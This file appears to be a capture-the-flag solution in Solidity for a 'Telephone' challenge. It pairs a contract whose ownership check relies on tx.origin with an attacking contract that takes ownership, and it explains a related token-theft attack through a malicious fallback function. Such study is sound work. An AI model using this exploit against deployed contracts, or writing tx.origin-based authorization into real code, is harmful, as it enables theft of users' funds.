pragma solidity ^0.5.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract PsuedoTelephone {
        
    Telephone public pt = Telephone(0x0aa7b75Eb74FB132c1D71e7d27969c7e4a9Cbc41);
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function myChangeOwner() public{
        
        pt.changeOwner(owner);
        
    }

}



The tx.origin global variable refers to the original external account that started the transaction while 
msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function. 


An example of a possible attack is outlined below.

1. Use tx.origin to determine whose tokens to transfer, e.g.

function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

function () payable {
  token.transfer(attackerAddress, 10000);
}

3. In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.